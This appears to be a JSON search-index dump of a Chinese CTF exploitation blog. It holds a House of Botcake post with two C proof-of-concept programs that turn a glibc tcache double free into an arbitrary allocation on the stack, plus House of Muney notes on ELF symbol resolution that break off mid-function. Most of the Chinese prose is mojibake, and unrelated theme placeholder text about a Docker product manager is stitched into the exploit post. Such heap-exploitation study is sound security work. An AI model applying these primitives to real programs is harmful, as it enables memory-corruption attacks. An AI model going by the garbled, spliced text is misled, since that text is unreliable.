


[{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/heap/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Basics","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/git/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Git","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of/","section":"æˆ‘çš„åšå®¢","summary":"","title":"House ofç³»åˆ—","type":"posts"},{"content":"\rHi there ğŸ‘‹ #\rğŸ³ Principal Product Manager @ Docker ğŸ¡ Creator and maintainer of Blowfish @ Blowfish page ğŸš€ Personal blog - n9o.xyz ğŸ“š mentoring @ mentorcruise house of botcake #\rä»‹ç» #\rHouse of botcacke åˆç†åˆ©ç”¨äº† Tcache å’Œ Unsortedbin çš„æœºåˆ¶ï¼ŒåŒä¸€å †å—ç¬¬ä¸€æ¬¡ Free è¿› Unsortedbin é¿å…äº† key çš„äº§ç”Ÿï¼Œç¬¬äºŒæ¬¡ Free è¿›å…¥ Tcacheï¼Œè®©é«˜ç‰ˆæœ¬çš„ Tcache Double Free å†æ¬¡æˆä¸ºå¯èƒ½ã€‚\nPOC #\rglibc 2.27 - 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); // cause chunk overlapping puts(\u0026#34;Now we are able to cause chunk overlapping\u0026#34;); puts(\u0026#34;Step 1: fill up tcache list\u0026#34;); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } puts(\u0026#34;Step 2: free the victim chunk so it will be added to unsorted bin\u0026#34;); free(a); puts(\u0026#34;Step 3: free the previous chunk and make it consolidate with the victim chunk.\u0026#34;); free(prev); puts(\u0026#34;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\u0026#34;); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); b[0x120/8-2] = (long)stack_var; malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); printf(\u0026#34;Got control on target/stack!\\n\\n\u0026#34;); return 0; } glibc 2.32\u0026ndash;2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); // prepare the target intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } free(a); free(prev); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); puts(\u0026#34;We simply overwrite victim\u0026#39;s fwd pointer\u0026#34;); b[0x120/8-2] = (long)stack_var; // take target out puts(\u0026#34;Now we can cash out the target chunk.\u0026#34;); malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); return 0; } åˆ©ç”¨æ€è·¯ #\rç”³è¯·7ä¸ª0x100å¤§å°çš„chunk åœ¨ç”³è¯·å¤§å°ä¸º0x100çš„chunk1 ï¼Œchunk2 free 7ä¸ªchunkå¡«å……tcache free chunk2,chunk1 ï¼Œä½¿å…¶è¿›å…¥unsorted binï¼Œå¹¶å› ä¸ºè¿ç»­æ‰€ä»¥åˆå¹¶ã€‚ malloc 0x100ï¼Œä»tacheé‡Œå–å‡ºä¸€ä¸ªfree chunk free chunk2 ä½¿å…¶è¿›å…¥ tache binï¼Œè¿™æ ·tache binä¸­å°±æœ‰äº†unsorted binä¸­çš„ä¸€å—å°å†…å­˜ malloc 0x120 ä» unsorted binä¸­åˆ†å‰²å‡ºæ¥ä¸€å—å†…å­˜ï¼Œå¯è¦†ç›–chunk2çš„nextæŒ‡é’ˆ ä¼ªé€ nextæŒ‡é’ˆ ","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of/house-of-botcake/","section":"æˆ‘çš„åšå®¢","summary":"","title":"House ofç³»åˆ—","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/","section":"æˆ‘çš„åšå®¢","summary":"è¿™æ˜¯ç½‘ç«™çš„ç¬¬ä¸€ç¯‡ä½ å¸–å­","title":"PWN","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/python/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Python","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/","section":"Tea","summary":"","title":"Tea","type":"page"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/web/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Web","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/","section":"æˆ‘çš„åšå®¢","summary":"","title":"æˆ‘çš„åšå®¢","type":"posts"},{"content":"\rHouse of ç³»åˆ— #\rhouse of muney #\rELFæ–‡ä»¶è§£æ #\rèŠ‚çš„ç»“æ„ #\ré™æ€è§†å›¾ä¸‹ï¼Œç»„æˆelfæ–‡ä»¶çš„åŸºæœ¬å•ä½æ˜¯sectionï¼Œå¯ä»¥ç¿»è¯‘ä¸ºèŠ‚ã€‚\nelfå¤´ä¼šå®šä¹‰èŠ‚å¤´è¡¨(æ‰€è°“çš„è¡¨ï¼Œå…¶å®éƒ½æ˜¯æ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œæ¯”å¦‚dyn/relç­‰)\nèŠ‚å¤´è¡¨ä¸­å®šä¹‰äº†èŠ‚çš„æ•°é‡ã€æ¯ä¸ªèŠ‚çš„ç±»å‹ã€èµ·å§‹çš„è™šæ‹Ÿåœ°å€ã€‚\nä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„èŠ‚ä¸º.dynamicèŠ‚ï¼Œè¿™é‡Œé¢å­˜å‚¨è¿™ä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„æè¿°ä¿¡æ¯ã€‚\n.dynamicå®é™…æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ å¯¹åº”çš„æ•°æ®ç»“æ„ä¸ºï¼š typedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type. è¡¨ç¤ºçš„æ˜¯èŠ‚çš„ç±»å‹ */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ //è¿™ä¸ªè”åˆä½“æœ‰æ—¶å€™è¡¨ç¤ºçš„æ˜¯è¿™ä¸ªèŠ‚å¤„åœ¨èŠ‚è¡¨ä¸­çš„ä¸‹æ ‡ï¼Œæœ‰æ—¶å€™è¡¨ç¤ºè¿™ä¸ªèŠ‚çš„è™šæ‹Ÿåœ°å€ } d_un; } Elf64_Dyn; ä¸ç¬¦å·æŸ¥æ‰¾ç›¸å…³çš„æ˜¯STRTABå’ŒSYMTABèŠ‚ç±»å‹ã€‚\nSTRTABï¼šå­—ç¬¦ä¸²è¡¨ ï¼ŒåŒ…å«ä¸€å¤§ä¸²å­—ç¬¦ä¸²ï¼ŒåŒ…å«æ•´ä¸ªç¨‹åºä¸­æ‰€ä½¿ç”¨åˆ°çš„æ‰€æœ‰å­—ç¬¦ã€‚\nSYMTABï¼šç¬¦å·è¡¨ï¼ŒåŒ…å«ç¬¦å·çš„å®šä¹‰ï¼Œå…¶å¯¹åº”çš„æ•°æ®ç»“æ„ä¸ºï¼š\ntypedef struct { Elf64_Word st_name; // ç¬¦å·ååœ¨.dynsträ¸­çš„åç§» unsigned char st_info; // ç¬¦å·ç±»å‹ï¼ˆSTT_FUNCç­‰ï¼‰å’Œç»‘å®šå±æ€§ï¼ˆSTB_GLOBALç­‰ï¼‰ unsigned char st_other; //é€šå¸¸ä¸º 0ï¼Œè¡¨ç¤ºç¬¦å·å¯è§æ€§ä¸ºé»˜è®¤ï¼ˆæ— éœ€ä¿®æ”¹ï¼‰ã€‚ Elf64_Section st_shndx; // ç¬¦å·æ‰€å±çš„èŠ‚åŒºç´¢å¼• Elf64_Addr st_value; // ç¬¦å·çš„åœ°å€ï¼ˆå¦‚å‡½æ•°åœ°å€ï¼‰ Elf64_Xword st_size; // ç¬¦å·å¤§å° } Elf64_Sym; //å¦‚æœä¿®æ”¹st_nameè¿™ä¸ªä¸‹æ ‡ï¼Œå°±èƒ½è§£æå‡ºä¸åŒçš„ç¬¦å·åœ°å€ã€‚ //å…³äºst_value,å½“ç¬¦å·æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–è€…å˜é‡çš„æ—¶å€™ï¼Œè¿™ä¸ªå€¼å°±ä»£è¡¨ç¬¦å·çš„è™šæ‹Ÿåœ°å€ï¼Œå¦‚æœå¼€å¯äº†PIEï¼Œé‚£ä¹ˆç¬¦å·çš„å®é™…åœ°å€å°±æ˜¯åŠ è½½çš„åŸºåœ°å€åŠ ä¸Šè¿™ä¸ªå€¼ã€‚ ç¬¦å·ç±»å‹ï¼šç¬¦å·çš„ç»‘å®šå±æ€§ï¼ˆst_infoå­—æ®µï¼‰åˆ†ä¸ºï¼š STB_LOCALï¼šå±€éƒ¨ç¬¦å·ï¼Œä»…åœ¨å½“å‰æ¨¡å—å¯è§ã€‚ 0x0 STB_GLOBALï¼šå…¨å±€ç¬¦å·ï¼Œå¯è¢«å…¶ä»–æ¨¡å—å¼•ç”¨ã€‚ 0x1 STB_WEAKï¼šå¼±ç¬¦å·ï¼Œä¼˜å…ˆçº§ä½äºå…¨å±€ç¬¦å·ã€‚ 0x2 ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨æè¿°äº†æ€ä¹ˆæ‰¾åˆ°ç¬¦å·ï¼Œä½†æ˜¯å¦‚ä½•æ ‡è¯†å“ªäº›ç¬¦å·éœ€è¦é‡å®šä½ï¼Œåˆ™éœ€è¦ä½¿ç”¨åˆ°é‡å®šä½è¡¨ã€‚\né‡å®šä½è¡¨æ•°æ®ç»“æ„\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; r_offsetï¼šè¿™ä¸ªå€¼ä»£è¡¨å¯¹åº”ç¬¦å·åœ¨gotè¡¨ä¸­çš„åœ°å€ã€‚ä½¿ç”¨ libc.got['xxx']å¾—åˆ°çš„å°±æ˜¯è¿™ä¸ªåœ°å€ã€‚ r_infoï¼šæœ‰ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä½32ä½è¡¨ç¤ºé‡å®šä½å…¥å£çš„ç±»å‹ï¼Œé«˜32ä½è¡¨ç¤ºè¿™ä¸ªé‡å®šä½ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ä¸‹æ ‡ã€‚ ret2pltæµç¨‹å›¾\nplt[0]å¤„ä»£ç \npush ModuleID jmp _dl_runtime_resolve ç¬¬ä¸€æ¬¡è°ƒç”¨gotè¡¨å¤„ä»£ç \npush n jmp plt[0] .gnu.hash èŠ‚çš„ç»“æ„ #\r.gnu.hash èŠ‚çš„ç»“æ„å¦‚ä¸‹ï¼ˆä»¥64ä½ELFä¸ºä¾‹ï¼‰ï¼š\nnbuckets (4å­—èŠ‚)ï¼šå“ˆå¸Œæ¡¶çš„æ•°é‡ã€‚ symndx (4å­—èŠ‚)ï¼šç¬¬ä¸€ä¸ªå…¨å±€ç¬¦å·åœ¨åŠ¨æ€ç¬¦å·è¡¨ï¼ˆ.dynsymï¼‰ä¸­çš„ç´¢å¼•ã€‚ maskwords (4å­—èŠ‚)ï¼šå¸ƒéš†è¿‡æ»¤å™¨æ©ç çš„ä½æ•°ï¼ˆä»¥ _wordsize ä¸ºå•ä½ï¼‰ã€‚ shift2 (4å­—èŠ‚)ï¼šå¸ƒéš†è¿‡æ»¤å™¨è®¡ç®—çš„ä½ç§»å€¼ã€‚ å¸ƒéš†è¿‡æ»¤å™¨æ•°ç»„ï¼šæ¯ä¸ªå…ƒç´ å¤§å°ä¸º _wordsize å­—èŠ‚ï¼ˆ64ä½ä¸‹ä¸º8å­—èŠ‚ï¼‰ã€‚ å“ˆå¸Œæ¡¶æ•°ç»„ï¼šæ¯ä¸ªæ¡¶æ¡ç›®å 4å­—èŠ‚ï¼ŒæŒ‡å‘ç¬¦å·é“¾è¡¨çš„èµ·å§‹ç´¢å¼•ã€‚ å“ˆå¸Œå€¼æ•°ç»„ï¼šæ¯ä¸ªå“ˆå¸Œå€¼å 4å­—èŠ‚ã€‚ æŸ¥æ‰¾å‡½æ•°ç¬¦å·çœŸå®åœ°å€æµç¨‹ #\rè°ƒç”¨å¤§æ¦‚ #\rä» plt è¡¨è·³è½¬åˆ° got è¡¨\npush n/push ModuleIDï¼Œç„¶åè·³è½¬åˆ°_dl_runtime_resolve å‡½æ•°ã€‚\nä¸Šä¸€æ­¥å®é™…æ˜¯æ‰¾åˆ°ç¬¦å·çš„é‡å®šä½è¡¨æ¡ç›®ã€‚åœ¨é‡å®šä½è¡¨ä¸­ï¼Œåˆ†åˆ«è®°å½•äº†è§£æå¥½åœ°å€åéœ€è¦å›å¡«çš„åœ°å€ï¼Œå³ç¬¦å·çš„ got è¡¨åœ°å€ï¼ŒåŒæ—¶è®°å½•äº†ç¬¦å·æ‰€åœ¨çš„ç¬¦å·è¡¨çš„ä¸‹æ ‡ã€‚\nåŠ¨æ€é“¾æ¥å™¨è§£æç¬¦å·ï¼ˆå¦‚è°ƒç”¨exitï¼‰\nè®¡ç®—å“ˆå¸Œå€¼ï¼šå¯¹ç¬¦å·åï¼ˆå¦‚\u0026quot;exit\u0026quot;ï¼‰è®¡ç®—GNUå“ˆå¸Œå€¼ã€‚ å¸ƒéš†è¿‡æ»¤ï¼šæ£€æŸ¥å“ˆå¸Œå€¼æ˜¯å¦å¯èƒ½å­˜åœ¨äºå“ˆå¸Œè¡¨ä¸­ã€‚ å®šä½å“ˆå¸Œæ¡¶ï¼šæ ¹æ®å“ˆå¸Œå€¼æ‰¾åˆ°å¯¹åº”çš„å“ˆå¸Œæ¡¶ï¼ˆbucketï¼‰ã€‚ éå†å“ˆå¸Œé“¾ï¼š ä»æ¡¶ä¸­è·å–é“¾çš„èµ·å§‹ç´¢å¼• chain_indexã€‚ å®é™…ç¬¦å·ç´¢å¼• bucket = chain_index + symoffsetã€‚ symoffset æ˜¯ .dynsym ä¸­ç¬¬ä¸€ä¸ªå…¨å±€ç¬¦å·çš„ç´¢å¼•å€¼ã€‚ ä¾‹å¦‚ï¼Œè‹¥ .dynsym å‰5ä¸ªç¬¦å·æ˜¯å±€éƒ¨ç¬¦å·ï¼ˆç´¢å¼•0~4ï¼‰ï¼Œç¬¬6ä¸ªç¬¦å·ï¼ˆç´¢å¼•5ï¼‰æ˜¯ç¬¬ä¸€ä¸ªå…¨å±€ç¬¦å·ï¼Œåˆ™ symoffset = 5ã€‚ éå†å“ˆå¸Œé“¾ï¼ŒåŒ¹é…å“ˆå¸Œå€¼åï¼Œé€šè¿‡ç´¢å¼•åœ¨ .dynsym ä¸­æ‰¾åˆ°ç¬¦å·æ¡ç›®ã€‚ æ‰¾åˆ°ç¬¦å·ä¹‹åï¼Œè®¡ç®—å‡ºçœŸå®çš„åç§»ï¼Œç„¶åå¡«å›åˆ° got è¡¨ï¼Œé¿å…ä¸‹ä¸€æ¬¡é‡æ–°è§£æ\nè°ƒç”¨è¯¥å‡½æ•°\n.gnu.hashèŠ‚ä¸­çš„å“ˆå¸Œæ¡¶å’Œ .dynsym èŠ‚çš„å…³ç³» #\r.gnu.hash èŠ‚ .dynsym èŠ‚\r+-------------------+ +-------------------+\r| å“ˆå¸Œæ¡¶æ•°ç»„ | | Elf64_Sym[0] |\r| buckets[0]: 0 +--------------\u0026gt;| (å±€éƒ¨ç¬¦å·ï¼Œå¿½ç•¥) |\r| buckets[1]: 2 | +-------------------+\r| ... | | Elf64_Sym[1] |\r+-------------------+ | (å±€éƒ¨ç¬¦å·ï¼Œå¿½ç•¥) |\r+-------------------+\rå“ˆå¸Œé“¾æ•°ç»„index = bucket - symoffset | Elf64_Sym[bucket] |\r+-------------------+ | (å…¨å±€ç¬¦å·å¼€å§‹) |\r| hasharr[index]:0xABC | \u0026lt;---------|st_name: \u0026#34;exit\u0026#34; |\r| hasharr[index+1]:0xDEF| | st_value: 0x... |\r+-------------------+ +-------------------+ ç»†èŠ‚ #\ræ¶‰åŠçš„æ•°æ®ç»“æ„ #\r.dynamic å®é™…æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ å¯¹åº”çš„æ•°æ®ç»“æ„ï¼š\ntypedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ } d_un; } Elf64_Dyn; ç¬¦å·è¡¨çš„æ•°æ®ç»“æ„ï¼š\ntypedef struct { Elf64_Word st_name; // ç¬¦å·ååœ¨.dynsträ¸­çš„åç§» unsigned char st_info; // ç¬¦å·ç±»å‹ï¼ˆSTT_FUNCç­‰ï¼‰å’Œç»‘å®šå±æ€§ï¼ˆSTB_GLOBALç­‰ï¼‰ unsigned char st_other; Elf64_Section st_shndx; // ç¬¦å·æ‰€å±çš„èŠ‚åŒºç´¢å¼• Elf64_Addr st_value; // ç¬¦å·çš„åœ°å€ï¼ˆå¦‚å‡½æ•°åœ°å€ï¼‰ Elf64_Xword st_size; // ç¬¦å·å¤§å° } Elf64_Sym; é‡å®šä½è¡¨çš„æ•°æ®ç»“æ„ï¼š\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; link_mapçš„æ•°æ®ç»“æ„ï¼š\nstruct symtab_cache { // è¿™é‡Œå¯ä»¥åŒ…å«ç¼“å­˜ç›¸å…³çš„å…·ä½“æˆå‘˜ï¼Œå¦‚å“ˆå¸Œè¡¨ã€ç¼“å­˜æ¡ç›®ç­‰ // ç®€åŒ–ç¤ºä¾‹ä¸­æš‚ä¸è¯¦ç»†å±•å¼€ }; // è¡¨ç¤ºå·²æ‰¾åˆ°çš„ç‰ˆæœ¬ä¿¡æ¯ struct r_found_version { // è¿™é‡Œå¯ä»¥åŒ…å«ç‰ˆæœ¬ç›¸å…³çš„å…·ä½“æˆå‘˜ï¼Œå¦‚ç‰ˆæœ¬å·ã€ç‰ˆæœ¬æ ‡å¿—ç­‰ // ç®€åŒ–ç¤ºä¾‹ä¸­æš‚ä¸è¯¦ç»†å±•å¼€ }; // é“¾æ¥æ˜ å°„ç»“æ„ï¼Œä»£è¡¨ä¸€ä¸ªå·²åŠ è½½çš„å…±äº«å¯¹è±¡ struct link_map { // å…±äº«å¯¹è±¡åŠ è½½åˆ°å†…å­˜ä¸­çš„åŸºåœ°å€ // æ‰€æœ‰å…±äº«å¯¹è±¡å†…çš„ç›¸å¯¹åœ°å€éƒ½è¦åŠ ä¸Šè¿™ä¸ªåŸºåœ°å€æ‰æ˜¯å®é™…å†…å­˜åœ°å€ ElfW(Addr) l_addr; // æŒ‡å‘å…±äº«å¯¹è±¡çš„ç»å¯¹æ–‡ä»¶åçš„å­—ç¬¦ä¸²æŒ‡é’ˆ // ç”¨äºæ ‡è¯†è¯¥å…±äº«å¯¹è±¡æ˜¯ä»å“ªä¸ªæ–‡ä»¶åŠ è½½çš„ char *l_name; // æŒ‡å‘å…±äº«å¯¹è±¡çš„åŠ¨æ€èŠ‚ï¼ˆ.dynamic èŠ‚ï¼‰çš„æŒ‡é’ˆ // åŠ¨æ€èŠ‚åŒ…å«äº†å…±äº«å¯¹è±¡åŠ¨æ€é“¾æ¥ç›¸å…³çš„é‡è¦ä¿¡æ¯ï¼Œå¦‚ç¬¦å·è¡¨ã€é‡å®šä½è¡¨ä½ç½®ç­‰ ElfW(Dyn) *l_ld; // æŒ‡å‘ä¸‹ä¸€ä¸ªåŠ è½½çš„å…±äº«å¯¹è±¡çš„ link_map æŒ‡é’ˆ // ç”¨äºå°†æ‰€æœ‰å·²åŠ è½½çš„å…±äº«å¯¹è±¡è¿æ¥æˆä¸€ä¸ªåŒå‘é“¾è¡¨ struct link_map *l_next; // æŒ‡å‘å‰ä¸€ä¸ªåŠ è½½çš„å…±äº«å¯¹è±¡çš„ link_map æŒ‡é’ˆ // ç”¨äºå°†æ‰€æœ‰å·²åŠ è½½çš„å…±äº«å¯¹è±¡è¿æ¥æˆä¸€ä¸ªåŒå‘é“¾è¡¨ struct link_map *l_prev; // æœ¬åœ°ç¬¦å·æŸ¥æ‰¾çš„ç¼“å­˜æŒ‡é’ˆ // å¯ä»¥æé«˜æœ¬åœ°ç¬¦å·æŸ¥æ‰¾çš„æ•ˆç‡ï¼Œå‡å°‘éå†ç¬¦å·è¡¨çš„æ¬¡æ•° struct symtab_cache *l_local_cache; // å…¨å±€ç¬¦å·æŸ¥æ‰¾çš„ç¼“å­˜æŒ‡é’ˆ // å¯ä»¥æé«˜å…¨å±€ç¬¦å·æŸ¥æ‰¾çš„æ•ˆç‡ï¼Œå‡å°‘éå†ç¬¦å·è¡¨çš„æ¬¡æ•° struct symtab_cache *l_global_cache; l_gnu_chain_zero // åªè¯»é‡å®šä½ï¼ˆRELROï¼‰æ®µçš„èµ·å§‹åœ°å€ // RELRO æ®µåŒ…å«ç¨‹åºåŠ è½½æ—¶å·²å®Œæˆé‡å®šä½çš„åªè¯»æ•°æ®ï¼Œæœ‰åŠ©äºæé«˜ç¨‹åºå®‰å…¨æ€§ ElfW(Addr) l_relro_addr; // åªè¯»é‡å®šä½ï¼ˆRELROï¼‰æ®µçš„å¤§å° ElfW(Addr) l_relro_size; // å…±äº«å¯¹è±¡åˆå§‹åŒ–å‡½æ•°çš„åœ°å€ // åœ¨å…±äº«å¯¹è±¡åŠ è½½åï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šè°ƒç”¨æ­¤å‡½æ•°è¿›è¡Œåˆå§‹åŒ–æ“ä½œ ElfW(Addr) l_init; // å…±äº«å¯¹è±¡ç»ˆæ­¢å‡½æ•°çš„åœ°å€ // åœ¨å…±äº«å¯¹è±¡å¸è½½å‰ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šè°ƒç”¨æ­¤å‡½æ•°è¿›è¡Œæ¸…ç†æ“ä½œ ElfW(Addr) l_fini; // æŒ‡å‘å®é™…çš„ link_map // åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨ä»£ç†æˆ–è™šæ‹Ÿçš„ link_mapï¼Œl_real æŒ‡å‘çœŸæ­£çš„å…±äº«å¯¹è±¡ä¿¡æ¯ struct link_map *l_real; // å…±äº«å¯¹è±¡çš„ç±»å‹ï¼Œå¦‚å¯æ‰§è¡Œæ–‡ä»¶ã€å…±äº«åº“ç­‰ // å¯ä»¥é€šè¿‡ä¸åŒçš„å€¼æ¥åŒºåˆ†ä¸åŒç±»å‹çš„åŠ è½½å¯¹è±¡ int l_type; ... ... }; ç»†èŠ‚æµç¨‹ #\r1.è·³è½¬åˆ°_dl_runtime_resolveå‡½æ•°åï¼Œä¿å­˜å„ä¸ªå¯„å­˜å™¨æ•°æ®ï¼Œç„¶åcall _dl_fixup è¿™ä¸ªå‡½æ•°ï¼Œè·å–åˆ°çœŸå®çš„åœ°å€ï¼ŒæŠŠåœ°å€ä¿å­˜åœ¨ r11 å¯„å­˜å™¨ä¸­ï¼ŒæŠŠç›¸å…³æ•°æ®æ¢å¤åï¼Œç›´æ¥ jmp r11ã€‚\nDump of assembler code for function _dl_runtime_resolve_xsavec: 0x00007ffff7fe7bc0 \u0026lt;+0\u0026gt;:\tendbr64 0x00007ffff7fe7bc4 \u0026lt;+4\u0026gt;:\tpush rbx 0x00007ffff7fe7bc5 \u0026lt;+5\u0026gt;:\tmov rbx,rsp 0x00007ffff7fe7bc8 \u0026lt;+8\u0026gt;:\tand rsp,0xffffffffffffffc0 0x00007ffff7fe7bcc \u0026lt;+12\u0026gt;:\tsub rsp,QWORD PTR [rip+0x14b35] # 0x7ffff7ffc708 \u0026lt;_rtld_global_ro+232\u0026gt; 0x00007ffff7fe7bd3 \u0026lt;+19\u0026gt;:\tmov QWORD PTR [rsp],rax 0x00007ffff7fe7bd7 \u0026lt;+23\u0026gt;:\tmov QWORD PTR [rsp+0x8],rcx 0x00007ffff7fe7bdc \u0026lt;+28\u0026gt;:\tmov QWORD PTR [rsp+0x10],rdx 0x00007ffff7fe7be1 \u0026lt;+33\u0026gt;:\tmov QWORD PTR [rsp+0x18],rsi 0x00007ffff7fe7be6 \u0026lt;+38\u0026gt;:\tmov QWORD PTR [rsp+0x20],rdi 0x00007ffff7fe7beb \u0026lt;+43\u0026gt;:\tmov QWORD PTR [rsp+0x28],r8 0x00007ffff7fe7bf0 \u0026lt;+48\u0026gt;:\tmov QWORD PTR [rsp+0x30],r9 0x00007ffff7fe7bf5 \u0026lt;+53\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7bfa \u0026lt;+58\u0026gt;:\txor edx,edx 0x00007ffff7fe7bfc \u0026lt;+60\u0026gt;:\tmov QWORD PTR [rsp+0x250],rdx 0x00007ffff7fe7c04 \u0026lt;+68\u0026gt;:\tmov QWORD PTR [rsp+0x258],rdx 0x00007ffff7fe7c0c \u0026lt;+76\u0026gt;:\tmov QWORD PTR [rsp+0x260],rdx 0x00007ffff7fe7c14 \u0026lt;+84\u0026gt;:\tmov QWORD PTR [rsp+0x268],rdx 0x00007ffff7fe7c1c \u0026lt;+92\u0026gt;:\tmov QWORD PTR [rsp+0x270],rdx 0x00007ffff7fe7c24 \u0026lt;+100\u0026gt;:\tmov QWORD PTR [rsp+0x278],rdx 0x00007ffff7fe7c2c \u0026lt;+108\u0026gt;:\txsavec [rsp+0x40] 0x00007ffff7fe7c31 \u0026lt;+113\u0026gt;:\tmov rsi,QWORD PTR [rbx+0x10] 0x00007ffff7fe7c35 \u0026lt;+117\u0026gt;:\tmov rdi,QWORD PTR [rbx+0x8] =\u0026gt; 0x00007ffff7fe7c39 \u0026lt;+121\u0026gt;:\tcall 0x7ffff7fe00c0 \u0026lt;_dl_fixup\u0026gt; 0x00007ffff7fe7c3e \u0026lt;+126\u0026gt;:\tmov r11,rax 0x00007ffff7fe7c41 \u0026lt;+129\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7c46 \u0026lt;+134\u0026gt;:\txor edx,edx 0x00007ffff7fe7c48 \u0026lt;+136\u0026gt;:\txrstor [rsp+0x40] 0x00007ffff7fe7c4d \u0026lt;+141\u0026gt;:\tmov r9,QWORD PTR [rsp+0x30] 0x00007ffff7fe7c52 \u0026lt;+146\u0026gt;:\tmov r8,QWORD PTR [rsp+0x28] 0x00007ffff7fe7c57 \u0026lt;+151\u0026gt;:\tmov rdi,QWORD PTR [rsp+0x20] 0x00007ffff7fe7c5c \u0026lt;+156\u0026gt;:\tmov rsi,QWORD PTR [rsp+0x18] 0x00007ffff7fe7c61 \u0026lt;+161\u0026gt;:\tmov rdx,QWORD PTR [rsp+0x10] 0x00007ffff7fe7c66 \u0026lt;+166\u0026gt;:\tmov rcx,QWORD PTR [rsp+0x8] 0x00007ffff7fe7c6b \u0026lt;+171\u0026gt;:\tmov rax,QWORD PTR [rsp] 0x00007ffff7fe7c6f \u0026lt;+175\u0026gt;:\tmov rsp,rbx 0x00007ffff7fe7c72 \u0026lt;+178\u0026gt;:\tmov rbx,QWORD PTR [rsp] 0x00007ffff7fe7c76 \u0026lt;+182\u0026gt;:\tadd rsp,0x18 0x00007ffff7fe7c7a \u0026lt;+186\u0026gt;:\tbnd jmp r11 End of assembler dump. _dl_fixupå‡½æ•°ï¼š\nDL_FIXUP_VALUE_TYPE attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE _dl_fixup ( # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS, # endif struct link_map *l, ElfW(Word) reloc_arg) { // è¿™é‡Œçš„læ˜¯äºŒè¿›åˆ¶ç¨‹åºæœ¬èº«çš„link_mapï¼Œè€Œä¸æ˜¯soçš„ // 